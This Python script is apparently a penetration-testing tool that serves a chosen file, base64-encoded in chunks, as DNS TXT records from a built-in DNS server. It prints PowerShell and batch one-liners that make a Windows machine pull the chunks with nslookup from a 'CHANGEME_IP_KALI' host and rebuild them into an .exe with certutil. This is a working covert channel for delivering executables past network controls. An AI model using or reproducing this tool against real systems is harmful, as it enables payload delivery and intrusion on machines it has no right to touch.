#!/usr/bin/python3


import json
import logging
import os
import signal
from datetime import datetime
from pathlib import Path
from textwrap import wrap
from time import sleep

from dnslib import DNSLabel, QTYPE, RR, dns
from dnslib.proxy import ProxyResolver
from dnslib.server import DNSServer
import base64
import argparse


"""
DNS Server Code from https://github.com/samuelcolvin/dnserver
"""

parser = argparse.ArgumentParser(description="Setup Zones File for DNS File Transfer")
parser.add_argument("File_To_Transfer")
args = parser.parse_args()


#Get File to server and base64 encode
with open(args.File_To_Transfer, "rb") as f:
    encodedFile = base64.b64encode(f.read())

encodedString = encodedFile.decode()

#Break up in segments 255 chars long, max TXT record length
x = 255
SplitString = [encodedString[i: i + x] for i in range(0, len(encodedString), x)]

#Get Rid of old Zone File if it exists, so new file can be served
if os.path.exists("ZoneFile.txt"):
  os.remove("ZoneFile.txt")

#Set Domain to server, can be anything
DName = ".texting.com"

#Create Zone file with b64 encoded chunks to be used by DNs server
z = 1
while z <= len(SplitString):
    fileopen = open('ZoneFile.txt', 'w')
    for chunk in SplitString:
        fileopen.write(str(z) + DName + "\t" + "TXT\t" + str(chunk) + "\n")
        z += 1
    fileopen.close()

#Print Out of Commands to Run
print(" ")
print("Powershell File Transfer, enter text below in powershell window, change CHANGEME_IP_KALI to IP address of Kali system")
print(" ")
print("del File.txt; del newFile; $c = \"\"; $i = 1; while ($i -le " + str(len(SplitString)) + "){$a = nslookup -q=txt " + "\"$i" + DName + "\" CHANGEME_IP_KALI | Select-String -Pattern '\"' | Out-String ; $b = $a.trim(); $c += $b.Replace(\"`\"\",\"\"); $i += 1}; $c.Replace(\"`n\",\"\") | Out-File -Append File.txt; certutil.exe -decode .\File.txt newFile.exe")
print(" ")
print(" ")
print("Batch File Transfer, enter text below in notepad.exe and save as bat file, change CHANGEME_IP_KALI to IP address of Kali system, then run")
print(" ")
print("@echo off")
print("for /l %%x in (1,1," + str(len(SplitString)) + ") do nslookup -q=txt %%x" + DName + "\" CHANGEME_IP_KALI | >> File.txt findstr \\\"")
print("setlocal EnableDelayedExpansion")


print("for /F \"tokens=*\" %%A in (File.txt) do (\n  set line=%%A\necho(!line: =!>>newfile1.txt\n)\ndel File.txt")
print("for /F \"delims=\" %%A in ('type \"newfile1.txt\"') do (\n  set row=%%A\nset row=!row:\"=!\necho.!row!>> \"newfile2.txt\"\n)\ndel newfile1.txt")

print("certutil -decode newfile2.txt File.txt\ndel newfile2.txt")
print("move File.txt File.exe")
print(" ")
print(" ")
print("DNS Server Log Info:")


#Below is DNS Server Code
SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())

handler = logging.StreamHandler()
handler.setLevel(logging.INFO)
handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s', datefmt='%H:%M:%S'))

logger = logging.getLogger(__name__)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

TYPE_LOOKUP = {
    'A': (dns.A, QTYPE.A),
    'AAAA': (dns.AAAA, QTYPE.AAAA),
    'CAA': (dns.CAA, QTYPE.CAA),
    'CNAME': (dns.CNAME, QTYPE.CNAME),
    'DNSKEY': (dns.DNSKEY, QTYPE.DNSKEY),
    'MX': (dns.MX, QTYPE.MX),
    'NAPTR': (dns.NAPTR, QTYPE.NAPTR),
    'NS': (dns.NS, QTYPE.NS),
    'PTR': (dns.PTR, QTYPE.PTR),
    'RRSIG': (dns.RRSIG, QTYPE.RRSIG),
    'SOA': (dns.SOA, QTYPE.SOA),
    'SRV': (dns.SRV, QTYPE.SRV),
    'TXT': (dns.TXT, QTYPE.TXT),
    'SPF': (dns.TXT, QTYPE.TXT),
}


class Record:
    def __init__(self, rname, rtype, args):
        self._rname = DNSLabel(rname)

        rd_cls, self._rtype = TYPE_LOOKUP[rtype]

        if self._rtype == QTYPE.SOA and len(args) == 2:
            # add sensible times to SOA
            args += (SERIAL_NO, 3600, 3600 * 3, 3600 * 24, 3600),

        if self._rtype == QTYPE.TXT and len(args) == 1 and isinstance(args[0], str) and len(args[0]) > 255:
            # wrap long TXT records as per dnslib's docs.
            args = wrap(args[0], 255),

        if self._rtype in (QTYPE.NS, QTYPE.SOA):
            ttl = 3600 * 24
        else:
            ttl = 300

        self.rr = RR(
            rname=self._rname,
            rtype=self._rtype,
            rdata=rd_cls(*args),
            ttl=ttl,
        )

    def match(self, q):
        return q.qname == self._rname and (q.qtype == QTYPE.ANY or q.qtype == self._rtype)

    def sub_match(self, q):
        return self._rtype == QTYPE.SOA and q.qname.matchSuffix(self._rname)

    def __str__(self):
        return str(self.rr)


class Resolver(ProxyResolver):
    def __init__(self, upstream, zone_file):
        super().__init__(upstream, 53, 5)
        self.records = self.load_zones(zone_file)

    def zone_lines(self):
        current_line = ''
        for line in zone_file.open():
            if line.startswith('#'):
                continue
            line = line.rstrip('\r\n\t ')
            if not line.startswith(' ') and current_line:
                yield current_line
                current_line = ''
            current_line += line.lstrip('\r\n\t ')
        if current_line:
            yield current_line

    def load_zones(self, zone_file):
        assert zone_file.exists(), f'zone files "{zone_file}" does not exist'
        #logger.info('loading zone file "%s":', zone_file)
        zones = []
        for line in self.zone_lines():
            try:
                rname, rtype, args_ = line.split(maxsplit=2)

                if args_.startswith('['):
                    args = tuple(json.loads(args_))
                else:
                    args = (args_,)
                record = Record(rname, rtype, args)
                zones.append(record)
                #logger.info(' %2d: %s', len(zones), record)
            except Exception as e:
                raise RuntimeError(f'Error processing line ({e.__class__.__name__}: {e}) "{line.strip()}"') from e
        logger.info('%d zone resource records generated from zone file', len(zones))
        return zones

    def resolve(self, request, handler):
        type_name = QTYPE[request.q.qtype]
        reply = request.reply()
        for record in self.records:
            if record.match(request.q):
                reply.add_answer(record.rr)

        if reply.rr:
            logger.info('found zone for %s[%s], %d replies', request.q.qname, type_name, len(reply.rr))
            return reply

        # no direct zone so look for an SOA record for a higher level zone
        for record in self.records:
            if record.sub_match(request.q):
                reply.add_answer(record.rr)

        if reply.rr:
            logger.info('found higher level SOA resource for %s[%s]', request.q.qname, type_name)
            return reply

        logger.info('no local zone found, proxying %s[%s]', request.q.qname, type_name)
        return super().resolve(request, handler)


def handle_sig(signum, frame):
    logger.info('pid=%d, got signal: %s, stopping...', os.getpid(), signal.Signals(signum).name)
    exit(0)


if __name__ == '__main__':
    signal.signal(signal.SIGTERM, handle_sig)

    port = int(os.getenv('PORT', 53))
    upstream = os.getenv('UPSTREAM', '8.8.8.8')
    zone_file = Path(os.getenv('ZONE_FILE', './ZoneFile.txt'))
    resolver = Resolver(upstream, zone_file)
    udp_server = DNSServer(resolver, port=port)
    tcp_server = DNSServer(resolver, port=port, tcp=True)

    logger.info('starting DNS server on port %d, upstream DNS server "%s"', port, upstream)
    udp_server.start_thread()
    tcp_server.start_thread()

    try:
        while udp_server.isAlive():
            sleep(1)
    except KeyboardInterrupt:
        pass
